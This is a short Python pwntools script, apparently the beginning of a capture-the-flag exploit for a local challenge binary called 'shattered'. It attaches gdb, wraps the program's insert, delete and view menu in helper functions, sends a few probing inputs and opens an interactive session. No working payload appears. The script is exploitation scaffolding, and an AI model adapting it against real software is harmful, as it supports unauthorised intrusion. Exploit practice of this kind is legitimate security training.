import hashlib
from pwn import *
#libc=ELF('/media/sf_kalishared/tools/The_Night-master/libcs/libc6_2.27-3ubuntu1_amd64.so')
#envi={"LD_LIBRARY_PATH":"/media/sf_kalishared/tools/The_Night-master/libcs/"}
#target=process(['/media/sf_kalishared/tools/itl-master/linkers/x64/ld-2.27.so','./shattered'],env=envi)
target=process('./shattered')
context.terminal=["tmux","split","-h"]
gdb.attach(target)
#gdb.attach(target,'''pie breakpoint *(0xcb8)''')
def insert(size,data,feedback):
	print(target.recvuntil("> "))
	target.sendline("1")
	print(target.recvuntil("> "))
	target.sendline(str(size))
	print(target.recvuntil("> "))
	target.send(data)	
	print(target.recvuntil("> "))	
	target.send(feedback)

def delete(data):
	print(target.recvuntil("> "))
	target.sendline("2")
	print(target.recvuntil("> "))
	target.send(data)
	print(target.recvline())
	
def view(data):
	print(target.recvuntil("> "))
	target.sendline("3")
	print(target.recvuntil("> "))
	target.send(data)
	print(target.recvline())
	

def exit():
	print(target.recvuntil("> "))
	target.sendline("4")

insert(30,"A\x00","blah")
view(hashlib.sha1("A"*30).hexdigest().decode("hex"))
insert(30,"B"*30,"blah")


target.interactive()
